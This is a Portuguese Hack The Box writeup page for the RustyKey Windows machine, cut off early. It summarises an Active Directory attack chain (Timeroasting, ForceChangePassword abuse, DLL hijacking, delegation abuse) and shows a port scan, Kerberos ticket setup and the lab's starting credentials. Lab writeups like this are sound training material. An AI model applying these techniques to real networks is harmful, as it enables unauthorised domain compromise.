<!doctype html><html lang=PT-BR dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="pt-br"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>RustyKey - HTB &#183; CatOverflow</title><meta name=title content="RustyKey - HTB &#183; CatOverflow"><meta name=description content="As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A"><meta name=keywords content="Windows,Hard,HTB,"><link rel=canonical href=https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/><meta name=author content="Richard Silva"><link href=https://github.com/richard-natan rel=me><link href=https://linkedin.com/in/richard-natan rel=me><meta property="og:url" content="https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/"><meta property="og:site_name" content="CatOverflow"><meta property="og:title" content="RustyKey - HTB"><meta property="og:description" content="As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A"><meta property="og:locale" content="pt_br"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2025-11-08T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-08T00:00:00+00:00"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Hard"><meta property="article:tag" content="HTB"><meta property="og:image" content="https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/featured.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://richard-natan.github.io/CatOverflow/writeups/rustykey-htb/featured.png"><meta name=twitter:title content="RustyKey - HTB"><meta name=twitter:description content="As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A"><link type=text/css rel=stylesheet href=/CatOverflow/css/main.bundle.min.29b1b652b273686f225077d2921fd88e263f083236da8ff2a7949bb3b5dc5823ce6fe0dbcafd35a78c54867ee7d62a9b4a971eb2140de6b419c9826bbb7e21c2.css integrity="sha512-KbG2UrJzaG8iUHfSkh/YjiY/CDI22o/yp5Sbs7XcWCPOb+Dbyv01p4xUhn7n1iqbSpceshQN5rQZyYJru34hwg=="><script type=text/javascript src=/CatOverflow/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script type=text/javascript src=/CatOverflow/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js integrity="sha512-mBTe6WFNMq61YjnRGO3+IKzWIxQk+bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script><script src=/CatOverflow/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/CatOverflow/js/main.bundle.min.9cc802d09f28c6af56ceee7bc6e320a39251fdae98243f2a9942f221ac57a9f49c51609699a91794a7b2580ee1deaa8e4d794a68ffa94aa317c66e893ce51e02.js integrity="sha512-nMgC0J8oxq9Wzu57xuMgo5JR/a6YJD8qmULyIaxXqfScUWCWmakXlKeyWA7h3qqOTXlKaP+pSqMXxm6JPOUeAg==" data-copy=Copiar data-copied=Copiado></script><script src=/CatOverflow/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><link rel=apple-touch-icon sizes=180x180 href=/CatOverflow/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/CatOverflow/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/CatOverflow/favicon-16x16.png><link rel=manifest href=/CatOverflow/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Writeups","name":"RustyKey - HTB","headline":"RustyKey - HTB","abstract":"As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker \/ 8#t5HE8L!W3A","inLanguage":"pt-br","url":"https:\/\/richard-natan.github.io\/CatOverflow\/writeups\/rustykey-htb\/","author":{"@type":"Person","name":"Richard Silva"},"copyrightYear":"2025","dateCreated":"2025-11-08T00:00:00\u002b00:00","datePublished":"2025-11-08T00:00:00\u002b00:00","dateModified":"2025-11-08T00:00:00\u002b00:00","keywords":["Windows","Hard","HTB"],"mainEntityOfPage":"true","wordCount":"3116"}]</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Ir para o conteúdo principal</a></div><div class="main-menu flex items-center justify-between py-6 md:justify-start gap-x-3 pt-[2px] pr-2 md:pr-4 pb-[3px] pl-0"><div><a href=/CatOverflow/ class=flex><span class=sr-only>CatOverflow</span>
<img src=/CatOverflow/images/logo.png width=512 height=512 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/CatOverflow/ class="text-base font-medium">CatOverflow</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/CatOverflow/writeups/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Writeups title=Writeups><p class="text-base font-medium">Writeups</p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Pesquisar (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Pesquisar (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/CatOverflow/writeups/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Writeups title=Writeups><p class="text-bg font-bg">Writeups</p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">RustyKey - HTB</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-11-08T00:00:00+00:00>8 novembro 2025</time><span class="px-2 text-primary-500">&#183;</span><span>3116 palavras</span><span class="px-2 text-primary-500">&#183;</span><span title="Tempo de leitura">15 minutos</span><span class="px-2 text-primary-500">&#183;</span><span class=mb-[2px]>
<span id=zen-mode-button class="text-lg hover:text-primary-500" title data-title-i18n-disable data-title-i18n-enable><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 50 50" width="50" height="50"><path fill="currentColor" d="M12.980469 4C9.1204688 4 5.9804688 7.14 5.9804688 11L6 26H9.9804688V11c0-1.65 1.3400002-3 3.0000002-3H40.019531c1.66.0 3 1.35 3 3V39c0 1.65-1.34 3-3 3H29c0 1.54-.579062 2.94-1.539062 4H40.019531c3.86.0 7-3.14 7-7V11c0-3.86-3.14-7-7-7H12.980469zM7 28c-2.206.0-4 1.794-4 4V42c0 2.206 1.794 4 4 4H23c2.206.0 4-1.794 4-4V32c0-2.206-1.794-4-4-4H7zm0 4H23L23.001953 42H7V32z"/></svg></span></span></span></span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/CatOverflow/tags/windows/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Windows
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/CatOverflow/tags/hard/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Hard
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/CatOverflow/tags/htb/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">HTB</span></span></a></div></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4" width=96 height=96 alt="Richard Silva" src=/CatOverflow/57724021_4528817659998141750_hu_446129f69c09faa3.png data-zoom-src=/CatOverflow/57724021_4528817659998141750.png><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Autor</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Richard Silva</div><div class="text-sm text-neutral-700 dark:text-neutral-400">Pentester | eJPTv2 | CRTA | Red Team</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/richard-natan target=_blank aria-label=Github title=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://linkedin.com/in/richard-natan target=_blank aria-label=Linkedin title=Linkedin rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs"><div class="toc ps-5 print:hidden lg:sticky lg:top-10"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Tabela de conteúdos</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#resumo>Resumo</a></li><li><a href=#recon-inicial>Recon inicial</a></li><li><a href=#analisando-o-active-directory>Analisando o Active Directory</a><ul><li><a href=#realizando-um-timeroasting-para-obter-o-it-computer3>Realizando um Timeroasting para obter o IT-Computer3$</a></li></ul></li><li><a href=#user-flag>User Flag</a><ul><li><a href=#realizando-um-forcechangepassword-para-obter-o-bbmorgan>Realizando um ForceChangePassword para obter o BB.MORGAN</a></li></ul></li><li><a href=#root-flag>Root Flag</a><ul><li><a href=#encontrando-o-dll-hijacking>Encontrando o DLL hijacking</a></li><li><a href=#obtendo-o-eereed>Obtendo o EE.REED</a></li><li><a href=#realizando-o-dll-hijacking-para-obter-o-mmturner>Realizando o DLL hijacking para obter o MM.TURNER</a></li><li><a href=#realizando-o-rcbd-para-obter-o-backupadmin>Realizando o RCBD para obter o BackupAdmin</a></li></ul></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Tabela de conteúdos</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#resumo>Resumo</a></li><li><a href=#recon-inicial>Recon inicial</a></li><li><a href=#analisando-o-active-directory>Analisando o Active Directory</a><ul><li><a href=#realizando-um-timeroasting-para-obter-o-it-computer3>Realizando um Timeroasting para obter o IT-Computer3$</a></li></ul></li><li><a href=#user-flag>User Flag</a><ul><li><a href=#realizando-um-forcechangepassword-para-obter-o-bbmorgan>Realizando um ForceChangePassword para obter o BB.MORGAN</a></li></ul></li><li><a href=#root-flag>Root Flag</a><ul><li><a href=#encontrando-o-dll-hijacking>Encontrando o DLL hijacking</a></li><li><a href=#obtendo-o-eereed>Obtendo o EE.REED</a></li><li><a href=#realizando-o-dll-hijacking-para-obter-o-mmturner>Realizando o DLL hijacking para obter o MM.TURNER</a></li><li><a href=#realizando-o-rcbd-para-obter-o-backupadmin>Realizando o RCBD para obter o BackupAdmin</a></li></ul></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><h2 class="relative group">Resumo<div id=resumo class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#resumo aria-label=Âncora>#</a></span></h2><p>A Rustykey é uma máquina de nível Hard que contém uma cadeia de ataques interessantes. Iniciamos com um usuário no Active Directory que nos permitiu enumerar o AD completamente, o que nos levou a um ataque de <code>Timeroasting</code> devido a várias contas de máquinas no AD. Após obtermos uma conta privilegiada no AD, conseguimos nos adicionarmos em um grupo que possuia permissão de <code>ForceChangePassword</code> sobre dois usuários. Após obter esses usuários, encontramos um PDF que nos levou a um ataque de DLL hijacking, o que permitiu obter mais um usuário privilegiado. E por fim, abusamos de um RCBD que permitia impersonar qualquer usuário do AD.</p><p>Essa é uma máquina bastante desafiadora e interessante. Ela fornece diversos aprendizados e práticas que encontramos em vários outros CTFs de Active Directory.</p><h2 class="relative group">Recon inicial<div id=recon-inicial class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#recon-inicial aria-label=Âncora>#</a></span></h2><p>Como sempre em todo CTF, estarei iniciando o scan de portas na máquina. Estarei utilizando o <a href=https://github.com/bee-san/RustScan target=_blank>Rustscan</a> para fazer esse scan rapidamente (você pode utilizar o nmap normalmente caso prefira):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rustscan -a 10.10.11.75 -u <span class=m>5000</span> -- -sV
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       REASON          VERSION
</span></span><span class=line><span class=cl>53/tcp    open  domain        syn-ack ttl <span class=m>127</span> Simple DNS Plus
</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  syn-ack ttl <span class=m>127</span> Microsoft Windows Kerberos <span class=o>(</span>server time: 2025-10-30 02:26:27Z<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   syn-ack ttl <span class=m>127</span> Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp   open  ldap          syn-ack ttl <span class=m>127</span> Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: rustykey.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds? syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?     syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    syn-ack ttl <span class=m>127</span> Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped    syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>5985/tcp  open  http          syn-ack ttl <span class=m>127</span> Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        syn-ack ttl <span class=m>127</span> .NET Message Framing
</span></span><span class=line><span class=cl>47001/tcp open  http          syn-ack ttl <span class=m>127</span> Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl>49664/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49665/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49666/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49667/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49673/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49674/tcp open  ncacn_http    syn-ack ttl <span class=m>127</span> Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>49675/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49676/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49677/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49680/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49696/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49730/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>Service Info: Host: DC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 pe-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>SEMPRE que rodar o Rustscan/Nmap, adicione o domain encontrado no seu arquivo <code>/etc/hosts</code> para não ter problemas de DNS. E SEMPRE que for possível, coloque o <code>dc.DOMINIO.htb</code> ANTES do <code>DOMINIO.htb</code>.</strong></span></div><p>Não encontramos nenhuma porta fora do comum em ambientes Windows, então como ja iniciamos com um usuário, irei pular para a enumeração das shares do SMB.</p><p>Ao tentar enumerar as shares vemos que a autenticação <code>NTLM</code> está desabilitada no Active Directory (autenticação com senhas), para &ldquo;burlar&rdquo; isso precisamos solicitar um <code>ticket TGT</code> (Ticket Granting Ticket) para conseguir nos autenticar com o Kerberos. Para fazer isso, estarei utilizando o <code>kinit</code>, porém antes disso precisamos configurar o <code>/etc/krb5conf</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>realms<span class=o>]</span>
</span></span><span class=line><span class=cl>    RUSTYKEY.HTB <span class=o>=</span> <span class=o>{</span>
